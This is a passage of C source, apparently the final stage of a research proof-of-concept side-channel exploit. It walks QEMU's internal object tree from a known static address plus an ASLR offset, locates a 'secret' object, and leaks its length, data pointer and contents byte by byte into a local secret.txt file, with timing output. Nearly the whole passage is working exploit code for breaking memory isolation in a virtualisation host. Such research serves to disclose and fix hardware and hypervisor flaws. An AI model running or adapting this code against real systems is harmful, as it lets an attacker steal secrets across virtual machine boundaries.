    // property that then has the opaque pointer at the 9-th position so offset 0x40

    clock_t start_secret_search = clock();

    printf("\n");
    printf("### find qemu objects ###\n");
    uint64_t obj_root_ptr;
    if (!leak_pointer_reliably(&ctxt, QEMU_OBJECTMAYHEM_STATIC + aslr_offset,
                               &obj_root_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve obj_root_ptr\n");
        return 1;
    }
    printf("root = 0x%012lx\n", obj_root_ptr);

    uint64_t objects_ptr;
    if (!resolve_object(&ctxt, obj_root_ptr, &objects_ptr, QEMU_MAGIC_ROOT_OBJECT,
                        "root")) {
        UARF_LOG_ERROR("Failed to resolve first level of objects\n");
        return 1;
    }
    printf("objects = 0x%012lx\n", objects_ptr);

    printf("\n");
    printf("### find qemu secret object ###\n");

    uint64_t secret_object_ptr;
    if (!resolve_object(&ctxt, objects_ptr, &secret_object_ptr, QEMU_MAGIC_SECRET_OBJECT,
                        "objects")) {
        UARF_LOG_ERROR("Failed to resolve second level of objects\n");
        return 1;
    }
    printf("secret_object = 0x%012lx\n", secret_object_ptr);

    printf("\n");
    printf("### parse secret object ###\n");

    // try to get the data pointer from the object
    uint64_t rawlen_ptr = secret_object_ptr + 0x30;
    uint64_t rawlen;
    if (!leak_pointer_reliably(&ctxt, rawlen_ptr, &rawlen)) {
        UARF_LOG_ERROR("Failed to retrieve rawlen\n");
        return 1;
    }
    printf("secret length: %ld\n", rawlen);

    uint64_t rawdata_ptr_ptr = secret_object_ptr + 0x28;
    uint64_t rawdata_ptr;
    if (!leak_pointer_reliably(&ctxt, rawdata_ptr_ptr, &rawdata_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve rawdata_ptr\n");
        return 1;
    }
    printf("secret pointer: 0x%012lx\n", rawdata_ptr);
    clock_t end_secret_search = clock();
#ifndef DEMO
    printf("secret_search time = %fs\n",
           ((double) (end_secret_search - start_secret_search)) / CLOCKS_PER_SEC);
#endif

    // leak the actual data

    FILE *f = fopen("./secret.txt", "w+");
    if (!f) {
        UARF_LOG_ERROR("Failed to open output file\n");
        return 1;
    }

    printf("\n");
    printf("### leak the raw data ###\n");
    fflush(stdout);
    uint8_t *leaked_secret = malloc(rawlen);
    if (!leaked_secret) {
        UARF_LOG_ERROR("Failed to allocate secret leak array\n");
        return 1;
    }
    clock_t start_leak_array = clock();
    for (uint64_t secret_offset = 0; secret_offset < rawlen; ++secret_offset) {
        uint64_t secret_ptr = rawdata_ptr + secret_offset;
        uint8_t res;
        for (int i = 0; i < 128 && !(res = leak_byte(&ctxt, secret_ptr,
                                                     &leaked_secret[secret_offset]));
             ++i)
            ;
        if (res) {
            uint8_t byte = leaked_secret[secret_offset];
            if (isprint(byte) && byte < 127)
                printf("%c", byte);
            else
                printf("@");
            fprintf(f, "%c", byte);
        }
        else {
            printf("?");
            fprintf(f, "?");
        }
        fflush(stdout);
        fflush(f);
        if (secret_offset % 64 == 63) {
            printf("\n");
        }
    }
    printf("\n");
    fflush(stdout);
    fflush(f);
    fclose(f);
    clock_t end_leak_array = clock();
#ifndef DEMO
    printf("leak_array time = %fs\n",
           ((double) (end_leak_array - start_leak_array)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

    munmap(mem, PAGE_1G);
    munmap((void *) RB_PTR, RB_SZ);

    return 0;
}
